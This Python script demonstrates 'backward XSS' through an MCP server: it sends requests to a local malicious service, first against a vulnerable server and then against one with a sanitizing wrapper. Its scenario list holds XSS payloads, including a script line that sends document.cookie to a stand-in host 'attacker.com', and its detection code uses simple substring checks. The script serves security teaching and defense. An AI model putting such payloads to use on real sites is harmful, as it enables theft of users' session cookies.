#!/usr/bin/env python3
"""
Backward XSS Attack & Defense Demonstration

This script demonstrates:
1. Backward XSS attacks against vulnerable MCP server (attacks succeed)
2. Backward XSS attacks against protected MCP server (attacks blocked)

Shows the difference between vulnerable and protected systems.

Backward XSS: An external service returns malicious HTML/JavaScript content.
The MCP server fetches this content and forwards it to users without sanitization,
allowing XSS payloads to execute in the user's browser.
"""

import asyncio
import sys
import json
import requests
import subprocess
import time
import signal
import os
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client
from defenses.backward_xss_protection_wrapper import create_backward_xss_protection_wrapper

# Track background processes for cleanup
background_processes = []


class MCPClientWrapper:
    """Wrapper to make MCP client work for direct tool calls"""
    
    def __init__(self):
        self.session = None
        self.server_params = None
        
    async def initialize(self):
        """Initialize connection to MCP server"""
        project_root = Path(__file__).parent.parent
        
        self.server_params = StdioServerParameters(
            command="python",
            args=["-m", "server.vulnerable_server"],
            env=None,
            cwd=str(project_root)
        )
        
        self.stdio_context = stdio_client(self.server_params)
        self.stdio_transport = await self.stdio_context.__aenter__()
        read, write = self.stdio_transport
        
        self.session_context = ClientSession(read, write)
        self.session = await self.session_context.__aenter__()
        await self.session.initialize()
    
    async def call_tool(self, tool_name: str, arguments: dict) -> dict:
        """Call a tool on the MCP server"""
        if not self.session:
            raise RuntimeError("MCP client not initialized")
            
        try:
            result = await self.session.call_tool(tool_name, arguments)
            if result.content:
                content_text = result.content[0].text if result.content else ""
                try:
                    return json.loads(content_text)
                except json.JSONDecodeError:
                    return {"raw": content_text}
            return {"status": "success"}
        except Exception as e:
            return {"error": str(e)}
    
    async def cleanup(self):
        """Clean up connections"""
        if hasattr(self, 'session_context') and self.session_context:
            await self.session_context.__aexit__(None, None, None)
        if hasattr(self, 'stdio_context') and self.stdio_context:
            await self.stdio_context.__aexit__(None, None, None)


async def create_mcp_client():
    """Create and initialize MCP client"""
    client = MCPClientWrapper()
    await client.initialize()
    return client


# Backward XSS Attack Scenarios
BACKWARD_XSS_ATTACK_SCENARIOS = [
    {
        "name": "Backward XSS - Script Tags in HTML",
        "description": "XSS service returns HTML with <script> tags containing malicious JavaScript",
        "url": "http://127.0.0.1:8003/page",
        "xss_type": "script_tags",
        "payload": "<script>alert('XSS Attack Successful!')</script>"
    },
    {
        "name": "Backward XSS - Event Handlers in HTML",
        "description": "XSS service returns HTML with event handlers (onerror, onclick, etc.)",
        "url": "http://127.0.0.1:8003/widget",
        "xss_type": "event_handlers",
        "payload": "onerror=\"alert('XSS')\""
    },
    {
        "name": "Backward XSS - JSON with XSS Payload",
        "description": "XSS service returns JSON with XSS payload in content field",
        "url": "http://127.0.0.1:8003/news",
        "xss_type": "json_xss",
        "payload": "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>"
    }
]


def check_service_running(port: int) -> bool:
    """Check if a service is running on the given port"""
    try:
        response = requests.get(f"http://127.0.0.1:{port}/", timeout=1)
        return response.status_code == 200
    except:
        return False


def start_service(name: str, module: str, port: int) -> subprocess.Popen:
    """Start a service in the background"""
    try:
        # Start service - output will go to background but service will log requests
        process = subprocess.Popen(
            [sys.executable, "-m", module],
            cwd=str(project_root),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        max_attempts = 10
        for attempt in range(max_attempts):
            time.sleep(0.5)
            if check_service_running(port):
                print(f"   Service started (PID: {process.pid})")
                print(f"   Service is listening on port {port} and will log incoming requests")
                return process
            if process.poll() is not None:
                print(f"   ERROR: Service process died during startup")
                return None
        print(f"   WARNING: Service may not have started properly")
        return process
    except Exception as e:
        print(f"   ERROR: Failed to start {name}: {e}")
        return None


async def simulate_user_request(mcp_client, user_query, attack_scenario, mode="vulnerable"):
    """Simulate a user making a request that triggers the attack"""
    
    print(f"\n{'─'*70}")
    print(f"Attack #{attack_scenario.get('number', '?')}: {attack_scenario['name']}")
    print(f"{'─'*70}")
    print(f"Mode: {'VULNERABLE' if mode == 'vulnerable' else 'PROTECTED'}")
    print()
    
    # Show user's request
    print(f"👤 USER REQUEST:")
    print(f"   {user_query}")
    print()
    
    # Show what MCP server will do
    print(f"🔧 MCP SERVER ACTION:")
    print(f"   Calling http_get tool with URL: {attack_scenario['url']}")
    print()
    
    # Show external service receiving request
    print(f"🌐 EXTERNAL SERVICE (XSS Service on port 8003):")
    print(f"   Receiving GET request to: {attack_scenario['url']}")
    print(f"   Responding with malicious content containing XSS payload...")
    print()
    
    try:
        result = await mcp_client.call_tool("http_get", {"url": attack_scenario['url']})
        
        if result.get("status") == "success":
            status_code = result.get("status_code", "N/A")
            content_type = result.get("headers", {}).get("content-type", "N/A")
            content = result.get("content", "")
            
            print(f"📥 MCP SERVER RECEIVED RESPONSE:")
            print(f"   HTTP {status_code} | Content-Type: {content_type}")
            
            # Extract content from JSON if needed
            if isinstance(content, dict):
                content_str = json.dumps(content)
                # Try to extract the actual content field
                if "content" in content:
                    actual_content = content["content"]
                elif "body" in content:
                    actual_content = content["body"]
                elif "data" in content and isinstance(content["data"], dict):
                    actual_content = content["data"].get("body") or content["data"].get("content", "")
                else:
                    actual_content = str(content)
            elif isinstance(content, str):
                content_str = content
                actual_content = content
            else:
                content_str = str(content)
                actual_content = str(content)
            
            print(f"Content length: {len(content_str)} bytes")
            
            # Check for XSS payloads
            xss_detected = False
            detected_types = []
            payload_snippet = None
            
            if "<script" in content_str.lower():
                detected_types.append("script tags")
                xss_detected = True
                # Find and show snippet of script tag
                script_start = content_str.lower().find("<script")
                if script_start != -1:
                    snippet = content_str[script_start:script_start+100]
                    payload_snippet = snippet.replace("\n", " ").strip()
            if "onerror" in content_str.lower() or "onclick" in content_str.lower():
                detected_types.append("event handlers")
                xss_detected = True
                if not payload_snippet:
                    handler_start = content_str.lower().find("onerror")
                    if handler_start == -1:
                        handler_start = content_str.lower().find("onclick")
                    if handler_start != -1:
                        snippet = content_str[handler_start:handler_start+80]
                        payload_snippet = snippet.replace("\n", " ").strip()
            if "javascript:" in content_str.lower():
                detected_types.append("javascript: protocol")
                xss_detected = True
                if not payload_snippet:
                    js_start = content_str.lower().find("javascript:")
                    if js_start != -1:
                        snippet = content_str[js_start:js_start+60]
                        payload_snippet = snippet.replace("\n", " ").strip()
            
            if mode == "protected":
                # Check if protection was applied
                if result.get("xss_protected") and result.get("sanitization_applied"):
                    patterns = result.get('xss_patterns_detected', [])
                    orig_len = result.get('original_content_length', len(content_str))
                    sanit_len = result.get('sanitized_content_length', len(content_str))
                    
                    print(f"🛡️  PROTECTION WRAPPER INTERCEPTED:")
                    print(f"   ⚠️  XSS patterns detected: {', '.join(patterns) if patterns else 'N/A'}")
                    print(f"   🔒 Sanitizing content: {orig_len} bytes → {sanit_len} bytes")
                    
                    # Show snippet of what was found
                    if payload_snippet:
                        print(f"   🚨 Malicious payload found: {payload_snippet}...")
                    
                    print()
                    print(f"👤 USER RECEIVES (SANITIZED):")
                    print(f"   ✓ Content has been sanitized - XSS payloads removed")
                    print(f"   ✓ Attack BLOCKED - safe content returned to user")
                elif xss_detected:
                    print(f"⚠️  WARNING: XSS detected but may not be fully sanitized")
                    print(f"   Detected: {', '.join(detected_types)}")
                    if payload_snippet:
                        print(f"   Payload snippet: {payload_snippet}...")
                else:
                    print(f"✓ No XSS patterns detected in response")
            else:
                # Vulnerable mode
                if xss_detected:
                    print(f"⚠️  MCP SERVER FORWARDING RESPONSE (NO SANITIZATION):")
                    print(f"   ✗ XSS payload detected: {', '.join(detected_types)}")
                    
                    # Show actual payload snippet
                    if payload_snippet:
                        print(f"   🚨 Malicious payload in response: {payload_snippet}...")
                    
                    print()
                    print(f"👤 USER RECEIVES (UNSANITIZED):")
                    
                    # Show a snippet of the actual content
                    if isinstance(actual_content, str) and len(actual_content) > 0:
                        preview = actual_content[:300].replace("\n", " ").strip()
                        if len(actual_content) > 300:
                            preview += "..."
                        print(f"   {preview}")
                    
                    print()
                    print(f"   ✗ VULNERABILITY: Unsanitized malicious content returned")
                    print(f"   ✗ Risk: If rendered in browser, XSS will execute")
                    print(f"   ✗ Attack SUCCESSFUL")
                else:
                    print(f"✓ No XSS patterns detected")
        else:
            print(f"✗ Error: {result.get('message', 'Unknown error')}")
            
    except Exception as e:
        print(f"✗ Error: {e}")
        import traceback
        traceback.print_exc()
    
    await asyncio.sleep(0.5)


async def demonstrate_vulnerable_system():
    """Demonstrate attacks against vulnerable MCP server"""
    print("\n" + "="*70)
    print("  PART 1: VULNERABLE SYSTEM (No Protection)")
    print("="*70)
    print("\nFlow: User Request → MCP Server → External XSS Service → MCP Server → User")
    print("Expected: XSS payloads will be returned unsanitized to the user\n")
    
    # Create vulnerable MCP client
    mcp_client = await create_mcp_client()
    
    # Number the attacks
    for i, attack in enumerate(BACKWARD_XSS_ATTACK_SCENARIOS, 1):
        attack['number'] = i
    
    # Run attacks
    user_queries = [
        "Fetch the content from http://127.0.0.1:8003/page",
        "Get the widget content from http://127.0.0.1:8003/widget",
        "Retrieve the news from http://127.0.0.1:8003/news"
    ]
    
    for i, attack_scenario in enumerate(BACKWARD_XSS_ATTACK_SCENARIOS):
        user_query = user_queries[i] if i < len(user_queries) else f"Fetch content from {attack_scenario['url']}"
        await simulate_user_request(mcp_client, user_query, attack_scenario, mode="vulnerable")
    
    await mcp_client.cleanup()
    
    # Summary
    print(f"\n{'─'*70}")
    print("PART 1 SUMMARY: Vulnerable System")
    print(f"{'─'*70}")
    print(f"Attacks executed: {len(BACKWARD_XSS_ATTACK_SCENARIOS)}")
    print("Result: All attacks SUCCEEDED - XSS payloads returned unsanitized")
    print("Issue: MCP server returns unsanitized content from external services")
    print("Risk: XSS payloads will execute if content is rendered in browser")
    
    await asyncio.sleep(2)


async def demonstrate_protected_system():
    """Demonstrate attacks against protected MCP server"""
    print("\n\n" + "="*70)
    print("  PART 2: PROTECTED SYSTEM (With XSS Protection)")
    print("="*70)
    print("\nFlow: User Request → MCP Server → External XSS Service → Protection Wrapper → User")
    print("Expected: XSS payloads will be detected and sanitized before reaching user\n")
    
    # Create base MCP client
    base_mcp_client = await create_mcp_client()
    
    # Wrap it with backward XSS protection
    protected_mcp_client = create_backward_xss_protection_wrapper(
        base_mcp_client,
        strict_mode=True,
        sanitize_html=True
    )
    
    # Number the attacks
    for i, attack in enumerate(BACKWARD_XSS_ATTACK_SCENARIOS, 1):
        attack['number'] = i
    
    # Run attacks
    user_queries = [
        "Fetch the content from http://127.0.0.1:8003/page",
        "Get the widget content from http://127.0.0.1:8003/widget",
        "Retrieve the news from http://127.0.0.1:8003/news"
    ]
    
    for i, attack_scenario in enumerate(BACKWARD_XSS_ATTACK_SCENARIOS):
        user_query = user_queries[i] if i < len(user_queries) else f"Fetch content from {attack_scenario['url']}"
        await simulate_user_request(protected_mcp_client, user_query, attack_scenario, mode="protected")
    
    # Security summary
    protection_stats = protected_mcp_client.get_protection_stats()
    
    # Summary
    print(f"\n{'─'*70}")
    print("PART 2 SUMMARY: Protected System")
    print(f"{'─'*70}")
    print(f"Attacks executed: {len(BACKWARD_XSS_ATTACK_SCENARIOS)}")
    print(f"Responses sanitized: {protection_stats['sanitized_count']}")
    print(f"Responses blocked: {protection_stats['blocked_count']}")
    print("Result: All attacks BLOCKED - XSS patterns detected and sanitized")
    print("Status: System is protected against Backward XSS attacks")
    
    await base_mcp_client.cleanup()
    await asyncio.sleep(2)


def cleanup_processes():
    """Clean up background processes"""
    print("Cleaning up background services...")
    for process in background_processes:
        try:
            process.terminate()
            process.wait(timeout=2)
        except:
            try:
                process.kill()
            except:
                pass
    print("Done.\n")


async def main():
    """Main demonstration function"""
    print("\n" + "="*70)
    print("  BACKWARD XSS ATTACK DEMONSTRATION")
    print("="*70)
    print("\nDemonstrating Backward XSS attacks against:")
    print("  1. Vulnerable MCP server (no protection)")
    print("  2. Protected MCP server (with XSS protection)")
    print("\n" + "="*70 + "\n")
    
    # Check if XSS service is running
    print("="*70)
    print("  SETUP: External XSS Service")
    print("="*70)
    if not check_service_running(8003):
        print("\nStarting XSS service on port 8003...")
        print("This service will respond to requests with malicious XSS payloads")
        xss_service = start_service("XSS Service", "external_service.xss_service", 8003)
        if xss_service:
            background_processes.append(xss_service)
            await asyncio.sleep(2)
            print("✓ XSS service is now running and ready to respond to requests")
            print("  Service URL: http://127.0.0.1:8003")
            print("  Endpoints: /page, /widget, /news (all contain XSS payloads)")
        else:
            print("ERROR: Failed to start XSS service")
            return
    else:
        print("\n✓ XSS service is already running on port 8003")
        print("  Service URL: http://127.0.0.1:8003")
        print("  Endpoints: /page, /widget, /news (all contain XSS payloads)")
    print()
    
    try:
        # Run demonstrations
        await demonstrate_vulnerable_system()
        await demonstrate_protected_system()
        
        # Final summary
        print("\n\n" + "="*70)
        print("  DEMONSTRATION COMPLETE")
        print("="*70)
        print(f"\nAttacks tested: {len(BACKWARD_XSS_ATTACK_SCENARIOS)}")
        print("\nKey Takeaways:")
        print("  • Without protection: XSS payloads pass through unsanitized")
        print("  • With protection: XSS patterns detected and sanitized")
        print("  • Protection wrapper prevents malicious content from reaching users")
        print("\n" + "="*70 + "\n")
        
    finally:
        cleanup_processes()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\nInterrupted. Cleaning up...")
        cleanup_processes()
        print("Exiting...\n")

